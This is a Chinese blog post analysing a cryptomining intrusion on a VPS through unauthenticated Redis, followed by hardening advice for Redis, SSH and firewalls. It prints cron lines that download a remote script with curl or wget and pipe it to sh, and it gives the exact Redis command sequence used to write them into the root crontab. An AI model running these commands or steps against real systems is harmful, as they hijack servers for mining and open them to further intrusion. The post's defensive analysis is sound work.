---
published: true
author: Robin Wen
layout: post
title: 区块链太火，小心你的服务器被动挖矿
category: 区块链
summary: >-
  某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO
  情况、网络流量、内存情况、系统日志、crontab 等。本篇文章从一起服务器被黑事件说起，分析了挖矿脚本、被黑过程，以及从 Redis
  、服务器、其他服务、日常用户等方面给出了防御方案。除了 Redis
  的未授权访问漏洞，目前主要存在未授权访问漏洞的还有：NFS，Samba，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo
  等，安全重于泰山，读者千万不要掉以轻心。
tags:
  - 区块链
  - Blockchain
  - 安全
  - Security
comments:
  - author:
      type: github
      displayName: dbarobin
      url: 'https://github.com/dbarobin'
      picture: 'https://avatars1.githubusercontent.com/u/3949252?v=4&s=73'
    content: |-
      &#x8FD9;&#x91CC;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x6848;&#x4F8B;&#xFF1A;

      * http://www.cnblogs.com/mobiwangyue/p/8431900.html
    date: 2018-03-08T07:35:45.842Z
  - author:
      type: github
      displayName: dbarobin
      url: 'https://github.com/dbarobin'
      picture: 'https://avatars1.githubusercontent.com/u/3949252?v=4&s=73'
    content: >-
      &#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x7684;&#x811A;&#x672C;&#xFF1A;&#x6B22;&#x8FCE;&#x8;
      clone&#x3002;


      https://github.com/BlockchainOne/crack-mining
    date: 2018-03-16T10:06:48.788Z
  - author:
      type: github
      displayName: zhoudean
      url: 'https://github.com/zhoudean'
      picture: 'https://avatars2.githubusercontent.com/u/14845335?v=4&s=73'
    content: >-
      &#x597D;&#x4E45;&#x6CA1;&#x6765;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x4E13;&#x6CE8;&#x4E8E;&#x7814;&#x7A76;&#x533A;&#x5757;&#x94FE;&#x4E86;&#xFF0C;&#x4E0D;&#x9519;&#x554A;
    date: 2018-04-02T09:01:36.677Z

---

`文/Robin`

***

**本站推广**

币安是全球领先的数字货币交易平台，提供比特币、以太坊、BNB 以及 USDT 交易。

> 币安注册: [https://accounts.binancezh.io/cn/register/?ref=11190872](https://accounts.binancezh.io/cn/register/?ref=11190872)
> 邀请码: **11190872**

***

这是「区块链技术指北」的第 28 篇文章。

> 如果对我感兴趣，想和我交流，我的微信号：**Wentasy**，加我时简单介绍下自己，并注明来自「区块链技术指北」。同时我会把你拉入微信群「区块链技术指北」。BTW，李笑来老师也加入了我的知识星球，文末有加入方式。

## 0x00 背景
***

某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO 情况、网络流量、内存情况、系统日志、crontab 等。当排查到 crontab 时，发现 crontab 有如下的任务：

``` bash
*/5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh
*/5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh
```

该服务器提供 Redis 资源供笔者测试使用，明显上面两个定时任务不是笔者创建的。定时任务访问外网服务器，紧急处理有三点，一是确认其他服务是否受到影响，二是注释定时任务，三是临时断外网，处理完之后，再来排查原因。

![2018-03-08-blockchain-crack-mining](https://cdn.dbarobin.com/Xf3ZNJY.jpg)

> 题图来自: © kisspng.com / Anonymous Guy Fawkes mask Gunpowder Plot / kisspng.com

## 0x01 挖矿脚本分析
***

笔者把该 Shell 脚本下载到本地，然后进行分析。该脚本包含以下函数：

* IKILLYOU
* FIRE
* DOWNLOAD
* INFO
* CRON
* CLEAN
* INIT
* ITABLE

我们 **逐个分析**。IKILLYOU 函数会 kill 掉 ssuspsplk 和 gpg-agentd 进程。CRON 函数会将文首的两个 crontab 写入到 /tmp/.bla.cron 文件，接着清空用户的 crontab，然后将 /tmp/.bla.cron 文件载入到 crontab。FIRE 函数删除掉 6379 端口相关的防火墙，允许本地连接，同时将防火墙配置持久化。INFO 函数用于收集主机信息，包含当前服务器进程、服务器硬件属性、系统内核版本、Linux 发行版本、Linux 发行的详细版本、Linux 标准规范信息、crondb 文件帮助信息（下文还会详细说明这个文件的作用），最后将以上信息上传到 84.73.251.157 指定目录。

接下来我们看下 DOWNLOAD 函数。该函数从 84.73.251.157 下载 `crondb` 和 `c.j` 文件，放到本地的 /tmp 目录。接下来执行关键的一步，**/tmp/crondb -c /tmp/c.j -B**。

我们将 crondb 文件和 c.j 放到本地，对这个两个文件进行分析。

上文提到 INFO 函数将获取 crondb 文件帮助信息。我们来执行下 INFO 函数的语句。

```
./crondb --help
Usage: xmrig [OPTIONS]
Options:
  -a, --algo=ALGO          cryptonight (default) or cryptonight-lite
  -o, --url=URL            URL of mining server
  -O, --userpass=U:P       username:password pair for mining server
  -u, --user=USERNAME      username for mining server
  -p, --pass=PASSWORD      password for mining server
  -t, --threads=N          number of miner threads
  -v, --av=N               algorithm variation, 0 auto select
  -k, --keepalive          send keepalived for prevent timeout (need pool support)
  -r, --retries=N          number of times to retry before switch to backup server (default: 5)
  -R, --retry-pause=N      time to pause between retries (default: 5)
      --cpu-affinity       set process affinity to CPU core(s), mask 0x3 for cores 0 and 1
      --cpu-priority       set process priority (0 idle, 2 normal to 5 highest)
      --no-huge-pages      disable huge pages support
      --no-color           disable colored output
      --donate-level=N     donate level, default 5% (5 minutes in 100 minutes)
      --user-agent         set custom user-agent string for pool
  -B, --background         run the miner in the background
  -c, --config=FILE        load a JSON-format configuration file
  -l, --log-file=FILE      log all output to a file
  -S, --syslog             use system log for output messages
      --max-cpu-usage=N    maximum CPU usage for automatic threads mode (default 75)
      --safe               safe adjust threads and av settings for current CPU
      --nicehash           enable nicehash/xmrig-proxy support
      --print-time=N       print hashrate report every N seconds
      --api-port=N         port for the miner API
      --api-access-token=T access token for API
      --api-worker-id=ID   custom worker-id for API
  -h, --help               display this help and exit
  -V, --version            output version information and exit
```

看到 Usage 这一步，再去 GitHub 项目搜索，我们可以得知 [xmrig](https://github.com/xmrig/xmrig) 是用于 Monero (XMR) CPU 挖矿的。接下来我们看下 c.j 文件，从 **/tmp/crondb -c /tmp/c.j -B** 得知。-c 参数表示配置文件，-B 表示后台运行。也就是说 c.j 是一个配置文件。我们打开 c.j 文件，看到关键的 pools 配置，可以得知 user 配置如下：

> 423DEFLqFZwb4gm9fMHVY8dm8KMFXhkMHg5FBwi9nXfS6P5LCd7cArbV83Cmmwi7ouBHihZS74ckNbRDyGNruQAFBnNCeNK

我们推测这是个 Monero (XMR) 钱包。

我们把 crondb 上传到 virscan.org，分析得出，详细的报告点击 [这里](http://r.virscan.org/report/c2ab5fa44a1a0f8545260c7aedc751aa)，其中 ikarus 标记为 PUA.CoinMiner，qh360 标记为 Win32/Virus.DoS.dc1，rising 标记为 Trojan.Linux.XMR-Miner。这也印证了这是个用于挖矿的可执行文件。

我们接着分析。接下来就是一些毁灭性的工作：

* 清空 /var/log/wtmp
* 清空 /var/log/secure
* 清空历史执行命令
* 修改包含 linuxsyn、clay、udevs、psql、smartd、redisscan.sh、ebscan.sh、gpg-agent、gpg-agentd、kethelper 文件的权限为 0644
* 清空 /tmp/unixinfect/imworking 文件

CLEAN 函数也是一个毁灭性的函数。首先会修改 /etc/security/limits.conf 和 /etc/sysctl.conf 系统配置文件。加入如下配置：

``` bash
* soft memlock 262144
* hard memlock 262144
vm.nr_hugepages = 256
```

接下来删除 RMLIST 列表的文件，kill 掉 KILIST 列表的进程。KILIST 里有些什么呢？也是挖矿的钱包地址或者相关的进程。这位哥们只想自己获利，不关心兄弟的死活，呵呵。接下来执行疯狂的 kill，也是挖矿钱包地址或者相关的进程，不过这个列表就有点多了，在此不赘述。

我们继续分析。INIT 函数修改 nr_hugepages 内核配置，ITABLE 函数删除掉 6379 端口相关的防火墙，允许本地连接，接下来 CRON 函数跟上文所述功能一致，在此不赘述。

最后做了脚本优化，如果发现没有 /tmp/crondb 和 /tmp/c.j 文件，继续下载。如果你的系统 GLIBC 版本不满足它的需求，还会帮你升级，加载到 LD_LIBRARY_PATH。接着将他自己的 key 写入到 authorized_keys 文件，这样它可以免密登陆，方便后续的操作。最后再清空 /var/log/wtmp、清空 /var/log/secure、清空历史执行命令。

由于 Monero (XMR) 不可追溯性，读者无法通过钱包地址追溯交易记录，也就是说我们无从得知黑客从中获益多少。

## 0x02 服务器被黑分析
***

分析到这里，我们对挖矿过程过程比较清楚了。但问题是，服务器为什么会被黑呢？

从刚才的分析得知，该脚本会处理 6379 端口，6379 端口是我们熟知的 Redis 端口。Redis 作者 antirez 很早之前写过一篇文章：[A few things about Redis security](http://antirez.com/news/96)，文中提到未授权访问漏洞，具体的漏洞可以参考这篇文章。

由于 VPS 服务器 Redis 端口没有添加密码，防火墙虽然开启，但防火墙开放权限过大，导致黑客趁机攻击。具体操作流程是怎么样的呢？

第一，扫描到该 VPS IP 存在 6379 Redis 端口，尝试无密码登陆。

第二，依次执行如下命令。

``` bash
set key1 "\n*/5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh\n"
set key2 "\n*/5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

第三，Linux 服务器自动加载到 crontab，然后定时任务执行 bar.sh 脚本，服务器被动用于挖矿。

由于 Redis 开启了 AOF，我们利用如下的脚本将 AOF 回溯 [1]，可以确认写入 KEY 的键值对。

``` python
#!/usr/bin/env python

""" A redis appendonly file parser
"""

import logging
import hiredis
import sys

if len(sys.argv) != 2:
   print sys.argv[0], 'aof_file'
   sys.exit()
file = open(sys.argv[1])
line = file.readline()
cur_request = line
while line:
    req_reader = hiredis.Reader()
    req_reader.setmaxbuf(0)
    req_reader.feed(cur_request)
    command = req_reader.gets()
    try:
        if command is not False:
            print command
            cur_request = ''
    except hiredis.ProtocolError:
        print 'protocol error'
    line = file.readline()
    cur_request += line
file.close
```

分析到此为止，我们可以从中得知，未授权漏洞是相当危险的，只要有这个口子，黑客可以做任何事情。

就在最近，一个朋友的服务器也有类似的现象。脚本可以参考：[crack-mining v2](https://github.com/BlockchainOne/crack-mining/tree/master/v2)。脚本大同小异，不过用于挖矿的可执行文件做了手脚。除了 Usage 这里的名字不一样，其他都是一样的。

![dump.db](https://cdn.dbarobin.com/oXJizEC.jpg)

同样，上传到 [virscan.org](http://virscan.org)，得到的报告，点击 [此处](http://r.virscan.org/report/fc17f9c18266646045fcd0375279bf34) 阅读。

## 0x03 防御方案
***

黑客作案手法我们已经清楚，那怎么样才能防御呢？笔者在这里给出自己的思考。

### 3.1 Redis 方面
***

Redis 作者在 [A few things about Redis security](http://antirez.com/news/96) 一文中提到，Redis 因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对 Redis 未授权访问的一种新型攻击方式，在特定条件下，如果 Redis 以 root 身份运行，黑客可以给 root 账户写入 SSH 公钥文件，直接通过 SSH 登录受害服务器，或者写入 crontab 定时任务，运行有危害的服务。这些攻击可能导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。[2]

**第一，网络层加固**，通常有如下两种方式：

* Redis 默认绑定在 0.0.0.0，也就是所有的 IP 都能访问。建议的做法是配置文件添加 bind 参数，允许本机以及内网 IP 地址访问，比如

``` bash
bind 127.0.0.1 192.168.0.1
```

注：Redis 从 2.8.0 版本开始，支持双 IP 绑定。

* 设置防火墙策略，比如：

``` bash
iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT
```

**第二，账号与认证**

设置访问密码，配置文件添加 requirepass，这个配置可以在线修改，配置完成之后，执行 CONFIG REWRITE 持久化到配置文件。

**第三，服务运行权限最小化**

Redis 默认使用 root 账号运行，但这会带来不可控的风险。我们希望用较低权限的用户来运行 Redis，实现账户隔离，保障 Redis 服务以及主机的安全。

调整如下：

``` bash
# 创建 redis 用户组
groupadd -r redis
# 添加 redis 用户，指定为系统用户，并且默认 Shell 改为 /sbin/nologin
useradd -c "Redis" -d /var/lib/redis -g redis -m -r -s /sbin/nologin redis
# 更改 Redis 主目录的权限
chown redis:redis -R /opt/redis
# 更改 Redis 相关程序的权限
chown redis:redis /usr/local/bin/redis*
```

最后再以 Redis 用户启动实例。

``` bash
su -s /bin/bash redis -c "/usr/local/bin/redis-server /opt/redis/$port/redis.conf"
```

**第四，服务精细化授权**

Redis 没有账户权限系统，为了避免入侵之后服务级命令需要重命名或者屏蔽。

高危的命令如下：

* FLUSHDB
* FLUSHALL
* KEYS
* PEXPIRE
* DEL
* CONFIG
* SHUTDOWN
* BGREWRITEAOF
* BGSAVE
* SAVE
* SPOP
* SREM
* RENAME
* DEBUG
* EVA

我们可以在配置文件添加对上述命令重命名或者屏蔽。

``` bash
# 屏蔽 CONFIG 命令
rename-command CONFIG ""

# 重命名 CONFIG 命令
rename-command CONFIG "XKGLx9LFl87mQQLVl0b7UI4VZJESG5iU"
```

**第五，安全补丁**

关注官方版本的变化以及漏洞列表，及时修补，必要时进行升级。

**第六，业务隔离。**

生产环境建议将 Redis 环境部署到内网，并且该服务器没有公网 IP。不过 VPS 一般都有公网 IP，如果 VPS 有 Redis 服务的，务必重视安全。

### 3.2 服务器方面
***

除了 Redis 本身，服务器方面我们也有很多安全策略。

**第一，服务器不使用默认的 22 端口**。22 端口是 SSH 服务的默认端口，这也是黑客扫描服务器 ssh 服务的默认端口。修改 SSH 端口的方法如下：vim 编辑 `/etc/ssh/sshd_config`，将其中的 `Port 22` 参数改成你想要的端口，通常 5 位数字最好。修改完成之后，重启 sshd 服务生效。

**第二，禁止使用密码登陆，使用 RSA 公钥登陆**。本地机器可以使用 `ssh-keygen -t rsa` 生成公钥和私钥，然后将公钥追加到服务器上的 ~/.ssh/authorized_keys 文件，注意此文件的权限是 600。SSH 配置如下：

``` bash
RSAAuthentication yes # RSA认证
PubkeyAuthentication yes # 开启公钥验证
AuthorizedKeysFile .ssh/authorized_keys # 验证文件路径
PasswordAuthentication no # 禁止密码认证
PermitEmptyPasswords no # 禁止空密码
```

最后重启 sshd 服务即可生效。

**第三，禁止 root 用户登录**。线上服务器，我们通常会以普通用户登陆，然后再 su - root 切换到 root 用户，这样做的好处是，即使被攻击了，也能有相应的保障。具体的方法是修改 `/etc/ssh/sshd_config` 配置文件，将 `PermitRootLogin` 改为 no。

**第四，添加服务器监控**。针对本文的案例，特别注意 CPU 告警。另外，还需要监测异常进程。

**第五，开启防火墙**。有公网 IP 的服务器，防火墙策略一定要做好。通常我们会限定 IP、限定端口，可以是特定的 IP 或者端口，也可以是 IP 或者端口范围，但切记开放某个 IP 段。

**第六，只从官方获取软件**。非官方渠道的软件很有可能被加入其他木马文件。正确的做法是只从官方下载，下载下来还要检查下文件的 MD5 值是否和官方公布的一致。

**第七，可以使用类似 [fail2ban](https://github.com/fail2ban/fail2ban) 对服务器安全进行加固**。它会监控多个系统的日志文件，并根据检测到的任何可疑的行为自动触发不同的防御动作。

### 3.3 其他服务
***

如果 VPS 服务器部署了 MySQL 等服务，这里也有很多安全措施。比如删除匿名账户、删除 test 库、权限最小化等。如果对 MySQL 安全感兴趣的可以参考 [此文](http://imysql.com/2016/03/15/sth-about-mysql-data-security.shtml)。

### 3.4 日常用户
***

对于没有 VPS 服务器的群友，那怎么样做好安全呢？即使没有 VPS 服务器，你的 PC 或者 Mac 也有可能被黑，用于挖矿。之前写过一篇 [区块链资产安全攻略](https://dbarobin.com/2017/12/18/blockchain-security-notice/)，读者可以参考下。针对本文的案例，这里笔者提出几点建议：

* 不要下载未知软件。
* 关注 PC 或者 Mac 动态，PC 有任务管理器，Mac 有 Activity Monitor，通常电脑被用于挖矿，CPU 资源会相当紧张。
* 使用 Chrome 等浏览器，谨慎访问网站。说不定你经常访问的网站哪天就被植入挖矿脚本。
* PC 关闭远程桌面共享、文件共享，Mac 关闭访客账户、文件共享、远程登陆。有需要使用时才打开，但用完之后立马关闭。

## 0x04 小结
***

本篇文章从一起服务器被黑事件说起，分析了挖矿脚本、被黑过程，以及从 Redis 、服务器、其他服务、日常用户等方面给出了防御方案。除了 Redis 的未授权访问漏洞，目前主要存在未授权访问漏洞的还有：NFS，Samba，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，**安全重于泰山，读者千万不要掉以轻心。**

对本文涉及到的攻击脚本感兴趣的读者，可以去 GitHub clone 看看。repo 链接：

* [crack-mining](https://github.com/BlockchainOne/crack-mining)

***

**本站推广**

币安是全球领先的数字货币交易平台，提供比特币、以太坊、BNB 以及 USDT 交易。

> 币安注册: [https://accounts.binancezh.io/cn/register/?ref=11190872](https://accounts.binancezh.io/cn/register/?ref=11190872)
> 邀请码: **11190872**

***

## 0x05 参考
***

* [1] 白宸 (2016-11-17). Redis 协议简介及持久化 Aof 文件解析. Retrieved from [https://yq.aliyun.com/articles/64345](https://yq.aliyun.com/articles/64345).
* [2] 阿里云 (2017-12-04). Redis 服务安全加固. Retrieved from [https://help.aliyun.com/knowledge_detail/37447.html](https://help.aliyun.com/knowledge_detail/37447.html).

「区块链技术指北」同名 **知识星球**，二维码如下，欢迎加入。BTW，**李笑来老师也加入了**。

![区块链技术指北](https://cdn.dbarobin.com/pQxlDqF.jpg)

「区块链技术指北」相关资讯渠道：

* 「区块链技术指北」同名知识星球，[https://t.xiaomiquan.com/ZRbmaU3](https://t.xiaomiquan.com/ZRbmaU3)
* 官方社区，[https://bbs.chainon.io](https://bbs.chainon.io)
* Telegram Channel，[https://t.me/chainone](https://t.me/chainone)
* Twitter，[https://twitter.com/bcageone](https://twitter.com/bcageone)
* 新浪微博，[https://weibo.com/BlockchainAge](https://weibo.com/BlockchainAge)

同时，本系列文章会在以下渠道同步更新，欢迎关注：

* 「区块链技术指北」同名微信公众号（微信号：BlockchainAge）
* 个人博客，[https://dbarobin.com](https://dbarobin.com)
* 知乎，[https://zhuanlan.zhihu.com/robinwen](https://zhuanlan.zhihu.com/robinwen)
* Steemit，[https://steemit.com/@robinwen](https://steemit.com/@robinwen)
* Medium，[https://medium.com/@robinwan](https://medium.com/@robinwan)
* 掘金，[robinwen@juejin.im](https://juejin.im/user/5673ccae60b2260ee435f89a/posts)
* 币乎，[https://bihu.com/people/22207](https://bihu.com/people/22207)

原创不易，读者可以通过如下途径打赏，虚拟货币、美元、法币均支持。

* BTC: 3QboL2k5HfKjKDrEYtQAKubWCjx9CX7i8f
* ERC20 Token: 0x8907B2ed72A1E2D283c04613536Fac4270C9F0b3
* PayPal: [https://www.paypal.me/robinwen](https://www.paypal.me/robinwen)
* 微信打赏二维码

![Wechat](https://cdn.dbarobin.com/SzoNl5b.jpg)

–EOF–

版权声明：[自由转载-非商用-非衍生-保持署名（创意共享4.0许可证）](http://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh)
